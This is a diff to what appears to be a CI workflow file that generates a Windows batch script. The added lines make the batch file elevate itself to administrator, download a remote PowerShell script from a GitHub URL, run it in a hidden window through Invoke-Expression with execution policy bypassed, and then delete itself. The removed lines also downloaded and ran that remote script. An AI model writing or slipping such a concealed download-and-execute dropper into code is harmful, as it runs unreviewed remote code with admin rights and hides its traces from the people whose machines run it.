@@ -77,29 +77,25 @@ jobs:
           @echo off
           setlocal
 
-          REM Path to save the downloaded script
-          set PSFILE=C:\Users\Public\Desktop\untitled.ps1
-
-          REM URL of the PowerShell script
-          set URL=https://raw.githubusercontent.com/djameledin/Desktop/refs/heads/main/untitled.ps1
-
-          echo Downloading PowerShell script...
-          powershell -NoLogo -Command ^
-              "Invoke-WebRequest -Uri '%URL%' -OutFile '%PSFILE%' -ErrorAction Stop"
-
-          if exist "%PSFILE%" (
-              echo Download completed successfully.
-          ) else (
-              echo Failed to download the PowerShell script.
-              pause
+          REM --- Check if running as admin ---
+          net session >nul 2>&1
+          if %errorLevel% NEQ 0 (
+              echo Running as administrator...
+              powershell -Command "Start-Process '%~f0' -Verb RunAs"
               exit /b
           )
 
-          echo Running PowerShell script...
-          powershell -ExecutionPolicy Bypass -File "%PSFILE%"
+          REM --- URL of the PowerShell script ---
+          set "URL=https://raw.githubusercontent.com/djameledin/Desktop/refs/heads/main/untitled.ps1"
 
-          echo Script finished.
-          pause
+          REM --- Run PowerShell script silently ---
+          powershell -NoLogo -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+              "(Invoke-WebRequest -Uri '%URL%' -UseBasicParsing).Content | Invoke-Expression"
+
+          REM --- Delete this batch file ---
+          del "%~f0"
+
+          exit
           "@
           
           Set-Content -Path $bat -Value $batContent -Encoding ASCII 
